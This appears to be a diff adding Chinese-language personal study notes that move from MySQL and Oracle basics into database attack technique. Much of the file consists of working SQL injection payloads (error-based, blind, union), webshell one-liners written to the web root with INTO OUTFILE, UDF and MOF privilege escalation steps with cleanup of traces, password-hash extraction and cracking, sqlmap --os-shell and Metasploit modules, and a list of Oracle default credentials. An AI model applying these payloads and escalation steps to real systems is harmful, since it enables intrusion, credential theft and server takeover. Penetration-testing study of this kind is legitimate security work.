@@ -1,0 +1,1264 @@
+关系型数据库：oracle、DB2、sql server、access、mysql
+非关系型数据库：nosql、mongoDB、redis.
+
+关系型：支持sql语句，存储结构主要是表，读写和高并发较差。
+非关系型：不提供sql支持；无事务处理；存储灵活、速度快。
+
+
+mysql：一般不区分大小写，但在linux下表名等会区分大小写。
+常见一种启动：
+/etc/init.d/mysql restart或service mysql restart
+
+windows启动：
+win+R-->net start mysql
+
+登录：一般为：
+常用：
+mysql -h hostnamez -u usernamez -p 	
+再输入密码。
+
+
+
+mysql常用命令：
+1. 创建用户：
+CREATE USER 'username'@'host' IDENTIFIED BY 'password';
+如：
+create user 'ztest1local'@'localhost' identified by 'ztest1localp';
+若想该用户除了能本地登录，还能从任意主机远程登录到该mysql服务器，则使用%
+如：
+create user 'ztest1yc'@'%' identified by 'ztest1ycp';
+
+flush privileges;	//最好使用一下。
+
+
+
+
+
+2. 授权：
+GRANT privileges ON databasename.tablename TO 'username'@'host'
+如：
+GRANT SELECT, INSERT ON test.user TO 'pig'@'%';
+GRANT ALL ON *.* TO 'pig'@'%';
+grant all on *.* to  'usernamez1'@'localhost';	
+//允许pig用户能从任意主机远程登录mysql 服务器，且访问其中的任意数据库中的任意表。
+
+
+3. 更改密码：
+SET PASSWORD FOR 'username'@'host' = PASSWORD('newpassword');
+如：
+SET PASSWORD FOR 'pig'@'%' = PASSWORD("123456");	//远程
+set password for 'usernamez1'@'localhost'=password('123qwe');	//本地
+前面两种方式出错，则：
+ALTER USER 'root'@'localhost' IDENTIFIED BY '123456';	//mysql8.0以上。
+
+alter user 'root'@'localhost' identified by 'passwdz1';
+flush privileges;
+
+4. 删除用户：
+drop user 'username'@'host';
+
+
+关机概念：
+主键：唯一能区分表中该行的数据或数据对。
+外键：用于关联两个表。
+索引：是对数据库表中一列或多列值进行排序的一种结构。
+
+select version();	//查看mysql版本
+
+
+
+
+ubuntu安装mysql：
+查询是否安装mysql：sudo netstat -tap | grep mysql
+安装：sudo apt-get install mysql-server mysql-client
+查看用户：select * from user;
+
+
+常用sql命令：
+show dabatases;
+create database test1;
+use test1;
+drop database test1;	//删除数据库test1
+select version();
+select database();	//查看当前数据库。
+
+show tables;
+
+创建表：字段名一般需用``引起来。
+CREATE TABLE IF NOT EXISTS `runoob_tbl`(
+   `runoob_id` INT UNSIGNED AUTO_INCREMENT,
+   `runoob_title` VARCHAR(100) NOT NULL,
+   `runoob_author` VARCHAR(40) NOT NULL,
+   `submission_date` DATE,
+   PRIMARY KEY ( `runoob_id` )
+)ENGINE=InnoDB DEFAULT CHARSET=utf8;
+
+drop table z1;
+
+增加：插入数据：
+INSERT INTO stu1(stu1_id,stu1_name) VALUES("386","wangdaqiang");
+在stu1表的stu1_id和stu1_name字段添加一条数据。
+因为字符串被强转为int型。直接写386也行。
+
+添加字段：
+ALTER TABLE stu1 ADD loc varchar(66);
+
+删除：
+DELETE FROM stu1 WHERE stu1_id=6;
+
+
+多个表使用,分隔。
+*代替所有字段。
+LIMIT 2,3;		//即从序号(默认从0开始)为2开始取3条数据。
+LIMIT 1;		//相当于LIMIT 0,1;
+LIMIT 3 OFFSET 2;	//即从序号(默认从0开始)为2开始取3条数据。
+
+
+修改：
+UPDATE stu1 SET stu1_loc="newyork",stu1_name="wangxm" WHERE stu1_id="386";
+alter table stu1 change loc stu1_loc varchar(68);	//修改stu1表的原字段名loc为stu1_loc
+
+
+select distinct Depart from Teacher;	//distinct关键字去重。
+
+模糊匹配：
+like	一般与%和_结合使用
+
+'%a'	//以a结尾的数据
+'a%'	//以a开头
+'%a%'	//中间有a
+'_a_'	//三位且中间字母为a的数据
+'_a'
+'a_'
+
+如：select * from stu1 where stu1_name LIKE "wangdaqia%";
+
+
+排序：
+select * from stu1 order by stu1_id;	//默认以stu1_id的升序(ASC)排序。
+select * from stu1 order by stu1_id DESC;	//DESC降序。
+
+select * from stu1 order by 3;		//即按第三个字段排序。偏移位从1开始。
+
+
+order by	X	判断字段个数。
+limit X,1		判断行数。
+
+联合查询：将多个表的查询数据组合后输出。一般是取出多个表的相同字段。
+注：多个表的取出字段个数必须一致。
+UNION		//取出多个表的相同字段后会去重。
+UNION ALL	//不会去重。
+select contry from tea1 union select contry from  stu1;
+
+
+mysql内置变量：
+#	注释
+-- -	//注释，等效于#  其中带有空格
+-- +	//注释，等效于#  其中带有空格
+核心是：--再跟一个空格 等效于#
+
+/**/	//内联注释(能注释多行)。如/*zhushiz*/
+database()	//当前数据库名。如：select database();
+user()		//当前用户名
+@@datadir	//数据文件存放目录
+@@basedir	//数据库的安装路径
+@@hostname	//主机名
+system_user()	//用户名
+version()		//数据库版本
+常与select搭配使用。
+
+
+
+
+mysql自带的库或表：
+<=5.0版本的mysql没有information_schema数据库，故无法通过查询该数据库来查询表名、字段等信息。则尝试爆破。
+高版本数据库、表说明：
+1.数据库：
+mysql：系统数据库，存放用户数据、设置等信息。
+a：user表：存放用户数据、用户名、加密后的密码、权限等信息。
+b：func表：存放用户注册的函数(udf提权相关)，若使用--skip-grant-tables选项启动mysql，则该表中的函数不会被加载且不可用。
+
+performance_schema：mysql性能相关信息。
+
+sys：将performance_schema数据汇总为更易理解的视图。
+
+information_schema：提供对数据库、元数据、表名、列名、数据类型或访问权限的访问。
+a：tables表：table_schema(表对应的数据库)、table_name(表名)。
+b：columns表(提供有关表中列的信息)：columns_name(列名或字段名)、table_schema(有该字段的表所属的数据库名)。
+
+
+sqlwiki站点：
+http://sqlwiki.radare.cn/
+
+
+
+常用函数：
+select concat(username,password) from admin;	//一列，拼接为一个字符串。若其中一个为NULL，则拼接后也为NULL
+select concat(id, ' | ', username,' | ',password) from admin limit 0,1;	//自定义分隔符
+
+select concat_ws('#',username,password) from admin limit 0,1;	//自定义分隔符为#
+该函数会忽略拼接字段的NULL值，只有当分隔符(第一个参数)为NULL时，结果才返回NULL.
+
+select group_concat(username) from admin;	//将admin表的username字段下的所有数据以,为分隔符 拼接为一个字符串，长度限制为1024
+select group_concat(concat_ws(' # ',username,password)) from admin;
+
+字符串截取：
+select substring((select username from admin limit 0,1),1,1);	//mysql的所有字符串截取函数，除了limit，其他全都是从1开始。
+select substr((select username from admin limit 0,1),3,2);	//从第3个字符开始取2个字符。
+select mid(username,3,2) from admin;	//从第3个字符开始取2个字符。此函数为mysql特有。
+
+select left(username,3) from admin limit 0,1;	//从左开始取3个字符。
+select right(username,3) from admin limit 0,1;	//从右开始取3个字符。
+
+select locate(username,'ztest1asdsad') from admin limit 0,1;	//返回取的username数据字符串在目标字符串ztest1asdsad中第一次的偏移位置。
+
+select ascii((select mid(username,1,1) from admin limit 0,1));	//取得该单个字符对应的十进制ascii码。
+select ord((select mid(username,1,1) from admin limit 0,1));		//两个函数等效。
+
+select char(mid(id,1,3)) from admin2 limit 4,1;	//对应的id值当作ascii数值再转为对应的ascii字符。
+select replace((select username from admin limit 0,1),'t','lkj');	//第一个参数(字符串)中所有的t被lkj字符串替换后再输出。
+
+
+select length(username) from admin limit 0,1;	//统计长度。
+select count(*) from admin;			//条数。
+
+进制转换：hex()	unhex()
+select hex(mid((select username from admin limit 0,1),1,1));
+select unhex(hex(mid((select username from admin limit 0,1),1,1)));
+select conv(18,10,16);	//将10进制的数值18转为16进制数值。 常用于绕过防护。
+
+
+大小写转换函数：
+select lower(conv(11,10,16));
+select upper(conv(45,10,16));
+
+select case when 1>0 then 'yeah! login succeed!' else 'no failed' end;	//相当于switch
+
+
+select * from admin where username rlike 'zdk';	//相较于like关键字，不需带%等通配符，更方便。
+select * from admin where username regexp 'st' order by id;	//正则匹配。
+
+
+
+读写文件的函数：
+如：原型为：
+<?php $sl = create_function('', @$_REQUEST['yikongjian']);$sl();?>
+hex编码后(注，需手动加上0x)。 再将16进制的结果尝试写shell。
+需有写权限。
+select id,passwd,username INTO OUTFILE '/root/z.txt'	
+//导出数据到 一般是mysql服务器所在主机的/root/z.txt文件。 into dumpfile与其等效。
+
+select load_file("/root/q.txt");	//读文件
+
+
+推荐二进制方式写：
+若是dll,so,exe等文件，必须二进制写。
+如：select 0x8238456353453454eksd98d8sdj4 into outfile '/var/ww/html/w.php';
+
+
+eg1：
+select hex("<?php @eval($_REQUEST[cmdz]);?>");
+得到：
+3C3F70687020406576616C28245F524551554553545B636D647A5D293B3F3E
+写入：
+select 0x3C3F70687020406576616C28245F524551554553545B636D647A5D293B3F3E into outfile 'D:/phpstudy/WWW/bachang1/BlogCode-master/wzq6.php';
+写入成功。
+访问即可：
+http://192.168.10.102:88/wzq6.php?cmdz=phpinfo();
+
+
+
+mysql虽然取出的数据显示是有大小写，但具体比较时(如=、like)是不区分大小写的。
+故盲注等最好还是采用ascii判断。
+
+
+
+
+mysql显错注入：
+1. rand()和group by配合floor()一起使用报错。
+原理：select rand() 一般属于(0,1)    rand()为伪随机函数，即如固定随机种子0后，则后面产生的序列是一样的。即检测时和插入时两次计算了随机数的值，造成临时表主键冲突。由于group by计算count(*)所致，若临时表中没有该键值，则查询数据时会计算一次floor(rand(0)*2)，插入该数据对应的键值时还会计算一次
+floor(rand(0)*2)，则造成临时表主键冲突。
+floor()为下取整。
+故：floor(rand(0)*2)则要么为0，要么为1.
+则select floor(rand(0)*2) from admin;每次输出相同顺序的随机序列。
+
+SELECT name, COUNT(*) FROM   employee_tbl GROUP BY name;	//表employee_tbl的name字段相同的统计个数，且按该数值排序。
+等效于：
+SELECT (name)qwz, COUNT(*)z FROM   employee_tbl GROUP BY name;	//重命名而已。
+
+
+核心：select count(*),floor(rand(0)*2) x from users group by x; 	//此种类型的都会报错。
+floor(rand(0)*2)报错条件：
+数据必须>=3条。	若>=3条则必定报错。
+
+利用类似句式造句即可：
+如：
+select count(*),concat(floor(rand(0)*2),user()) x from admin group by x; 	
+//报错。 但高版本好像不行了。
+
+eg：
+select count(*),concat(floor(rand(0)*2),(substr((select group_concat(t1_name) from testz_t1),1,100))) x from user group by x;
+
+
+
+
+
+报错注入二：利用xpath语法错误。
+extractvalue(xml_doc,xpath)	//从指定xml文档中查询指定字符串
+updatexml(xml_doc,xpath,new_value)	//利用xpath将该xml文档中的指定字符串替换为新值
+如：
+select extractvalue(1,concat(0x7e,(SELECT concat(username,'|',password) FROM admin limit 0,1)));
+select updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);	
+注：0x7e为~的16进制。
+
+
+报错2：
+mysql> select GeometryCollection((select * from (select * from(select user())a)b));
+
+谷歌搜索sql报错方式。
+
+select lpad('hell',10,'#');	//左填充指定字符串#包括hell在内填充至10个字符串的长度再输出。
+select rpad('hell',10,'#');	//右填充。
+
+
+
+时间盲注常用函数：
+benchmark(count,expr)	  //性能测试函数，即执行expr表达式count次
+sleep(second)		     //休眠函数。如select sleep(5); 则休眠5s
+如：
+select benchmark(1000000000,(select sha('admin')));	
+//若后面的select没有该值或字段等则会产生时延。
+
+select * from admin where username='admin' and sleep(5);
+//若select * from admin where username='admin' 无数据或错误什么的则产生时延。
+
+
+
+为什么数据库写入数据支持16进制呢？
+A：因为数据库底层存储就是以16进制进行存储的。
+
+
+过waf：
+1.编码、混淆、加密。
+
+
+
+报错注入总结：注：有时%20反而会出错，还不如直接空格。	直接尝试url编码和不编码两种。
+最常用。
+where 56456='dfghfhg'^updatexml(1,concat(0x7e,(version()),0x7e),0)-- -';	
+where 68或'gfhtz'=9或'sdfw'^updatexml(1,concat(0x7e,(version()),0x7e),0)-- -';
+
+数据库：
+uname=admin&passwd=fghfhg'^updatexml(1,concat(0x7e,(substr((select%20database()),1,1000)),0x7e),0)-- -
+
+表名：
+uname=admin&passwd=fghfhg'^updatexml(1,concat(0x7e,(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema='security'),1,1)),0x7e),0)-- -
+这个不太行，问题可能是passwd的返回值应该需为int型，故修改如下：
+uname=admin&passwd=6'^updatexml(1,concat(0x7e,(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema='security'),1,1)),0x7e),0)-- -
+因为会自动转换。
+
+
+字段名：
+User-Agent: firefoxad','16'^updatexml(1,concat(0x7e,(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),1,100)),0x7e),0)-- -
+
+
+查字段的数据：取了别名。
+uname=admin&passwd=6'^updatexml(1,concat(0x7e,(substr((select * from (select%20group_concat(username)%20from%20users)q ),40,100)),0x7e),0)-- -
+
+
+
+
+为什么有时url编码能绕过过滤，如sql注入：
+首先，mysql等一般不支持url编码，但各种应用程序支持，我们的数据先到达应用程序，它经过各种处理后再到达数据库进行处理。
+故很可能有判断或对url进行解码等规则。
+
+
+
+mysql8.0新特性：
+安全和账户管理：>=8.0.19
+mysql系统数据库的授权表原来是MyISAM(非事务性)表，现在是InnoDB(事务)表。
+也支持Kerberos身份验证。
+支持SHA-256散列加密，默认的身份插件为：caching_sha2_password
+出现了两个新的关键字table和values
+如：
+tables users;	//列出users表的内容。
+values row(1,2,3),row(4,5,6),row(7,8,9)	//可以构造一个新表
+
+
+mysql信息收集：
+3306	//mysql默认端口
+
+1.使用nmap：nmap -p 3306 --script="mysql-*" -v 3 192.168.43.46
+2.使用msf：search portscan type:auxiliary
+3.使用websell。
+4.御剑、cs端口扫描、masscan等。
+
+收集版本信息：
+mysql：select @@version;或select version();
+MSF：auxiliary/scanner/mysql/mysql_version模块
+webshell查看安装目录获取版本信息。
+
+收集密码等信息：
+1.mysql：
+A：提取user.MYD文件中的hash值，暴破。
+B：
+select host,user,password from mysql.user;	//5.6及以下
+select host,user,authentication_string from mysql.user;	//5.7及以上
+2.MSF：
+auxiliary/scanner/mysql/mysql_login模块(暴破、若mysql>=5.7则无法暴破)。
+3. webshell查看配置文件，如config.php等。
+4. nmap：mysql-brute.nse、mysql-empty-password.nse
+
+将ztablename.frm文件和ztablename.MYD文件和ztablename.MYI文件都下载下来，放在如MySQL5.5.29\data\mysql\下，然后执行
+select * from ztablename; 即可查看该表数据。
+
+或hashcat破解：
+hashcat -a 0 -m 300 --force 'hashvaluez' passwordz.txt -O
+
+或直接记事本打开MYD文件，前面一半，后面一半对应拼接再cmd5查询即可。
+
+*.frm描述了表的结构；*.MYD保存了表的数据记录；*.MYI则是表的索引；
+.opt记录数据库的选项，数据库的字符集设置。
+
+
+
+
+mysql写shell条件：
+1.指定网站绝对路径：
+A：利用报错页面信息等。
+B：暴力猜解目标站点的绝对路径(实战还行)。
+C：js文件是否有泄露。
+D：phpinfo页面泄露站点绝对路径等。
+
+2.GPC(magic_quotes_gpc)关闭或没用addslashes函数等，核心是单引号等需要用到的特殊字符不能被转义。
+3.root账号或等同于root权限的其他账号未被降权，否则一般没有写权限。
+4.有目录的读写权限(php5.3之后my.ini下的secure-file-priv)
+
+修改secure-file-priv参数，使具有写权限：
+windows：修改my.ini在[mysqld]内加入secure_file_priv=
+linux：修改my.cnf在[mysqld]内加入secure_file_priv=
+重启mysql服务。
+若根本没有该参数，还是不能写。
+
+
+写shell：
+手动：
+A：select '<?php eval($_POST[cmd]); ?>' into outfile '/var/www/q.php';	//为绝对路径
+B：and 1=2 union all select 0x2834jdfj56jdsjf56 into outfile '/var/www/q.php';	
+//以16进制的方式将马写入到文件。
+
+若写入windows系统，则需如下写(路径格式)：推荐：
+select '<?php eval($_POST[cmd]); ?>' into outfile 'D:\\phpstudy\\WWW\\finalw2.php';
+或：
+select '<?php eval($_POST[cmd]); ?>' into outfile 'D:/phpstudy/WWW/finalw2.php';
+
+sqlmap写入：
+sqlmap -u "http://192.168.43.68/?id=6" --file-write="/root/q.php" --file-dest="/var/www/html/z.php"		//将本地root目录下的q.php文件上传到目标(需为绝对路径)。
+
+
+mysql提权：
+UDF(用户自定义函数)提权：
+原理：通过导入UDF(dll或so文件)引入自定义函数实现系统命令的执行。
+mysql.func表：存放用户注册的函数。
+
+一般dll文件对应windows；so文件对应linux.
+
+windows下udf提权条件：版本主要是区分<5.1和>5.1
+1.有读写权限(secure_file_priv).
+2.有相应目录(存放插件的目录)的写入权限，若mysql版本>5.1则需有权限创建lib\plugin目录.
+3.root账户或等同于root权限的其他账户未被降权(还是为了写权限).
+
+udf提权步骤：
+1.确定root账户或等同于root权限的其他账户是否有被降权：
+法1：net user查询是否有mysql、mysqld等相关账号，若有，则很可能已被降权。
+法2：端口能否外联。一般下root用户只能本地连接。
+
+确认是否有读写权限。是否有针对插件目录的创建或读写权限。
+
+2.准备udf提权文件(提取sqlmap的udf提权文件)
+路径：一般在sqlmap项目路径\data\udf\mysql
+udf提权文件已被编码，需解码。
+cloak.py一般在sqlmap项目\extra\cloak下。
+
+linux：
+python cloak.py -d -i lib_mysqludf_sys.so -o lib_mysqludf_sys_32.so
+windows：
+python cloak.py -d -i lib_mysqludf_sys.dll -o lib_mysqludf_sys_64.dll
+其中-i指定源文件，-o自定义输出文件。
+
+
+3.查询数据库版本、系统、插件路径、secure_file_priv等信息：
+select @@version;	//查看版本
+select @@version_compile_os,@@version_compile_machine; //查看系统架构
+show variables like '%compile%';	//看系统架构
+select @@basedir;		//查询数据库安装路径
+select @@plugin_dir;	//查询插件路径
+show variables like '%secure%';	//查询secure_file_priv参数信息
+
+
+4.将udf文件放到指定位置(windows使用lib_mysqludf_sys.dll，linux则用lib_mysqludf_sys.so)。
+若mysql>5.1，则udf.dll文件必须放在mysql安装目录的lib\plugin\下，该目录默认不存在，需手动创建。
+若5.0<=mysql<5.1，则udf.dll文件在win下放置于C:\winodws\system32\下；
+win server 2000放置于C:\winnt\system32\下。
+
+
+mysql_UDF提权16进制查询：
+https://www.sqlsec.com/tools/udf.html
+
+
+select load_file('C:\\Users\\lkj\\Desktop\\lib_mysqludf_sys.dll') into dumpfile "E:\\phpz\\Extensions\\Mysql5.7\\lib\\plugin\\udf.dll";	//注意命名
+或16进制的方式导入：
+select hex(load_file('C:\\Users\\lkj\\Desktop\\lib_mysqludf_sys.dll')) into dumpfile 'C:\\lkj\\Desktop\\zhex.txt';	//转为16进制
+
+select unhex("6166726567486A6173645E6A6173646A666467736466") into dumpfile "E:\\phpz\\Extensions\\Mysql5.7\\lib\\plugin\\udf6.dll";
+其中6166726567486A6173645E6A6173646A666467736466为zhex.txt文本中的内容(没有0x)。
+
+eg1：
+select unhex('6B616978696E2063657368692079657A7A') into outfile 'D:/phpstudy/WWW/bachang1/BlogCode-master/wzq14.php';
+
+
+
+
+
+创建目录方式1：利用NTFS ADS创建目录。高版本(如5.7以上)一般写入会有权限限制，低版本一般可以。
+select 'xxx' into dumpfile 'D:\\phpstudy\\Extensions\\MySQL5.0.96\\lib::$INDEX_ALLOCATION';	//新建lib目录
+select 'xxx' into dumpfile 'D:\\phpstudy\\Extensions\\MySQL5.0.96\\lib\\plugin::$INDEX_ALLOCATION';	//新建plugin目录
+
+select into outfile和dumpfile异同：
+同：都能写入文件。
+异：outfile将查询结果写入文件，会转义换行符等，若导出为二进制会失败；
+dumpfile则是对文件内容原始写入。
+
+5.从udf文件中引入自定义函数：
+sys_eval	//执行任意命令，并将输出返回
+sys_exec	//执行任意命令，并将退出码返回
+sys_get	//获取一个环境变量
+sys_set	//创建或修改一个环境变量
+
+create function sys_eval returns string soname 'udf.dll';	//从udf文件中引入函数，成功后查询func表即能看到。若udf文件被删除，即使导入到func表还是会执行失败。
+drop function sys_eval;	//删除函数，清除痕迹。
+create function sys_exec returns int soname 'udf.dll';
+drop function sys_exec;	//删除函数，清除痕迹。sys_exec主要是用于运行脚本。
+
+通过select * from func;查看引进引入的有哪些函数。
+delete from func where ret=0;	//删除func表中符合where条件的行。
+
+6.执行自定义函数：
+select sys_eval('dir');
+select sys_eval("whoami");
+
+第三方udf提权工具：
+1.sqlmap：
+sqlmap.py -d "mysql://zusername:zpasswd@192.168.43.68:3306/mysql" --os-shell
+2.msf：
+exploit/windows/mysql/mysql_payload模块
+3.UDF webshell
+
+
+上传大马，导出udf文件到对应路径，执行成功。
+
+
+mysql -h 192.168.43.46 -u root - p 123456 < D:\\phpstudy\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.hex		//通过直接导入udf文件的方式。即使命名为udf.dll应该也可以。
+
+mof提权：
+mof为mysql数据库的扩展文件，称为托管对象格式，主要用于定时监控进程创建和死亡。
+一般在C:/windows/system32/wbem/mof/nullevt.mof
+提权原理：mof文件运行时为系统权限，攻击者通过替换mof文件获得提权。
+
+利用条件：
+windows<=2003.
+对C:/windows/system32/mof目录有读写权限。
+低版本mysql，无secure_file_priv特性。
+
+步骤：
+1.导入mof文件：即替换。
+select load_file("C:\\wz\\nullevt.mof") into dumpfile "C:/windows/system32/wbem/mof/nullevt.mof";
+2.等待运行即可。
+注：msf的exploit/windows/mysql/mysql_mof模块可以实现mof提权。
+
+
+
+
+eg1：mysql5.0之udf提权：
+上传大马->执行sql，如select version();发现版本为5.0-->使用大马导出对应的udf文件到对应目录，一般是在mysql所在盘的根目录下，如D:\BH64.dll
+若已经导出BH64.dll文件到C:\Windows\System32\下，则-->大马再点击一下按照dll，再执行命令 成功。
+
+eg2：mysql5.7之udf提权：
+上传大马-->手动创建对应mysql目录下lib文件夹和lib目录下的plugin文件夹-->
+使用大马导入对应版本的udf文件到对应目录(发现即使失败却写入udf文件成功)，或者自己手动上传udf文件也可以-->引入该文件里的函数：若大马执行失败，则自己手动执行sql命令引入-->建议尽量手工执行sql语句。
+
+常见错误：
+1.出错mysql> drop function sys_eval;
+FUNCTION mysql.sys_eval does not exist
+A：
+重启mysql.	
+注：在drop function之前，不要删除udf库文件。
+
+总结：马的功能底层还是php等语言实现的，不要太靠它们。若有shell，如使用php来实现shell，用antsword连接。核心还是看权限，读写权限。  antsword创建目录、上传udf文件、若知道数据库凭证，则手动执行sql语句实现udf提权。
+若只能执行sql语句，则尝试写shell到网站目录，或尝试写udf文件到对应的目录。若能写成功则一般没什么问题。
+
+
+
+
+
+猜测：多半是mysql通过zudf.dll文件取读写windows注册表，进而实现命令执行。
+sqlmap的dll文件都是一样的，步骤：
+将udf文件导入到对应目录下(使得mysql能找到)，再执行sql语句引入该文件里的函数，再执行命令。
+
+Oracle默认端口：1521
+一个实例可以创建多个用户。一个实例理解为一个进程。
+一个表空间(逻辑结构)只能属于一个数据库，一个表空间可以被多个用户使用。
+
+权限：
+系统权限：
+1.DBA权限：拥有全部权限，只有拥有DBA权限的用户才能创建数据库结构。sys账户、system账户为降权后的系统账户。
+sys账户为最高权限的账户，拥有DBA等权限(有sysdba、sysoper等权限)。
+system账户只拥有普通DBA角色的权限(相当于sys的降权版本，只有normal权限)，若使用
+as sysdba登录则为sys用户登录。
+
+
+DBA分三种权限：差不多
+1.normal		//普通DBA用户权限
+2.sysdba		//拥有最高的系统权限，登陆后是sys
+3.sysoper 	//主要用来启动、关闭数据库， sysoper登陆后用户是 public
+
+
+2.RESOURCE权限：有该权限的用户只能创建实体，不能创建数据库结构。
+3.CONNECT权限：有该权限的用户只能登录Oracle，不能创建实体或数据库结构。
+
+PUBLIC	//为所有数据库账户的集合
+
+实体权限：用户对其他用户的表或视图的存取权限。
+
+
+oracal系统表：
+dba_tables	//系统里所有的表的信息，只有DBA权限能查询
+all_tables		//当前用户有权限的表的信息
+user_tables	//当前用户名下的表的信息
+DBA_ALL_TABLES	//DBA用户所拥有的或有访问权限的对象或表
+ALL_ALL_TABLES	//某一用户所拥有的或有访问权限的对象或表
+USER_ALL_TABLES	//某一用户所拥有的对象或表
+
+虚拟表DUAL：
+自动创建的，只有一列：DUMMY，数据类型为VARCHAR2(1)
+只有一行数据：'X'
+DUAL属于SYS模式，但所有用户都能使用DUAL名称来访问。
+如：Oracle使用select查询时需指定表名，若其表不存在则可用DUAL表代替。
+
+Oracle默认口令：
+用户名/密码		登录身份或权限		含义
+sys/change_on_install	SYSDBA或SYSOPER		不能以NORMAL登录，一般为最高权限
+system/manager		SYSDBA或NORMAL	不能以SYSOPER登录
+sysman/oem_temp		sysman			为oms的用户名
+scott/tiger		NORMAL			普通用户
+aqadm/admin		SYSDBA或NORMAL	高级队列管理员
+Dbsnmp/dbsnmp		SYSDBA或NORMAL	复制管理员
+
+
+注入相关的sql语句：oracal和mysql差不多，一般不区分大小写，最好还是当区分处理。
+查看版本：
+select banner from v$version where banner like 'Oracle%';
+select banner from v$version where banner like 'TNS%';
+select version from v$instance;
+
+select 1 from dual --comment	//注释。即--后面的都是注释。
+select count(*) from dual	//统计数据数量
+select user from dual	//查看当前用户名
+
+查看用户列表：
+select username from all_users order by username;
+select name from sys.user$; -- priv 	//dba权限运行
+
+
+
+查看用户hash：
+select name,password,astatus from sys.user$ -- priv, <=10g.	
+select name,spare4 from sys.user$ -- priv, 11g
+
+列出DBA账户：
+select distinct grantee from dba_sys_privs where admin_option='YES'; -- priv
+
+查看所有表对应的用户名：
+select distinct owner from all_tables;
+
+
+
+查看当前数据库名：
+select global_name from global_name;
+select name from v$database;
+select instance_name from v$instance;
+select sys.database_name from dual;
+
+列出指定表下的字段或列名：注：表名一定要大写。最好全都大写.
+select column_name from all_tab_columns where table_name='STUDENT2';
+select column_name from all_tab_columns where table_name='STUDENT2' and owner='SYS';
+
+SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE ROWNUM<3 AND TABLE_NAME='STUDENT2';	//获取当前用户表中的列名，取前2个
+SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE ROWNUM=1 AND TABLE_NAME='STUDENT2';	//获取当前用户表中的列名，取第一个字段
+
+
+SELECT ID FROM (SELECT ROWNUM R, ID FROM STUDENT2 ORDER BY ID) WHERE R=2;	//获取第2行的数据(ID是student2表中的字段)
+
+SELECT * FROM STUDENT2;	//查看该表数据
+
+列出所有表：
+select table_name from all_tables;
+select owner,table_name from all_tables;
+select table_name from user_tables where rownum=1;	//获取当前用户所拥有的表的第一行
+
+select substr('abcd',3,1) from dual; --return c	//截取字符
+select bitand(6,2) from dual; -- return 2		//按位与运算
+select bitand(6,1) from dual; -- return 0		//按位与运算
+
+
+
+select 'A'||'B' from dual; --return AB	//字符连接
+
+条件语句：
+begin if 1=1 then dbms_lock.sleep(3);else dbms_lock.sleep(0);end if;end;
+select (case when 1=1 then 1 else 2 end) from dual; --return 1
+select (case when 1=2 then 1 else 2 end) from dual; --return 2
+
+begin dbms_lock.sleep(5);end;	//休眠5s
+
+
+oracle常用命令：
+select * from persons2;	//查看表
+show user;		//查看当前用户
+drop table persons2;	//删除表
+
+
+
+create user C##usernameq1 IDENTIFIED BY  passwdq1;	//新建CDB用户
+grant connect,resource,dba to C##usernameq1;	//赋予CDB用户dba等权限
+注：sys下一般不能进行drop字段或其他的一些操作。
+
+
+
+
+sql注入：
+-- -	//注释符
+#	//注释符
+/*zhu shi fuz*/	//注释符
+/*!fei zhu shi fu*/	//非注释符
+
+
+sql注入的前提：
+1.存在可控参数。
+2.该参数传递过去能与后端数据库进行交互。
+
+
+sql注入类型：
+1.参数类型：
+a.数字型：select user from users where id=1
+b.字符型：select user from users where id='1'
+
+
+2.证明类型：说明其很可能存在漏洞的方式。
+显注：
+a.报错类型：有回显或无回显关键字。
+b.联合查询注入：通过联合查询注入回显多余的信息。
+盲注：优先考虑布尔盲注。
+c.时间盲注：根据时间延迟来判断是否被执行。
+d.布尔盲注：根据两次返回页面的不同或差异来判断注入语句是否被执行，包括http状态码、响应时间、内容长度等，只要有差异就应该注意。核心：区分逻辑上的真假。
+
+
+union中每个select语句选出来的必须具有相同的列数。
+列也需具有相似的数据类型。
+NULL与其他的数据类型都兼容，因为NULL可以转换为其他类型，常用于占坑。
+oracle中，每个select查询必须使用from关键字并指定一个有效的表，若不清楚表名，则用DUAL代替，
+如：UNION SELECT NULL FROM DUAL --
+
+挖掘步骤：尝试才开发人员写的原型代码；根绝猜测的sql原型本地实验sql注入查询。
+1.确定功能点是否与数据库存在交互，参数是否可控。确定注入位置或参数：
+a.get请求：优先考虑url上的参数。其次UA、XFF、Cookie
+b.post请求：优先考虑请求正文里的参数。
+
+
+2.确定功能点是否为注入点：
+a.报错法。 核心：还是判断是否执行了插入的语句。
+b.正确错误法。 核心：判断是否执行，返回是否有差异。如and 1=1;-- -   and 1=2;-- -
+
+
+3.确定功能点对应的注入语句原型或结构。
+a.增：insert.	一般不会回显。
+b.删：delete.	利用报错，可能会回显。
+c.改：update.	利用报错，可能会回显。
+d.查：select.	
+	数字型：不需考虑单引号闭合等。
+	字符型：一般需考虑闭合。
+
+确定注入参数类型：
+a.数字型：select user from users where id=1
+b.字符型：select user from users where id='1'
+
+4.确定数据库类型：mysql、oracle、mssql、access.
+5.确定证明类型：即注入的类型。
+a.显注：
+	a1：联合查询注入(最优)：前提：确定字段数和输出位。
+	a2：报错注入。
+b.盲注：布尔盲注(优先)。 逐位猜解。
+
+
+
+6.获取数据库名。
+7.获取表名；获取列名；获取关键字段内容。
+
+
+
+
+通过盲注方式：盲注一般是逐位猜解。
+1. new_list.php?id=1 and 1=1-- -	
+    new_list.php?id=1 and 1=2-- -	判断成功。
+2. new_list.php?id=1 and 1=(select length(user) from DUAL)-- -
+通过burp爆破出长度为6.
+new_list.php?id=1 and 's'=substr((select user from DUAL),1,1)-- -	//发现user为SYSTEM
+new_list.php?id=1 and 's'=substr((SELECT name FROM V$DATABASE),1,1)-- -	//查询当前数据库为XE
+
+
+11g r2后可以用listagg函数(多行拼接为一行)，
+new_list.php?id=-2 union select listagg(USER_NAME,';') WITHIN GROUP(ORDER BY USER_NAME),'ywdz' from "sns_users"-- -	//查询所有用户。其中USER_NAME为sns_users表中的一个字段，自定义的分号为分隔符。
+11g r2之前的用wm_concat函数连接字段，即wm_concat(USER_NAME)  其中USER_NAME为字段名
+
+下划线_一般可以匹配任何单个字符。
+如：'a' like '_'和'b' like '_'都为真。
+
+-->获取表名：
+select listagg(NAME,';') from student2;	//NAME字段以;拼接
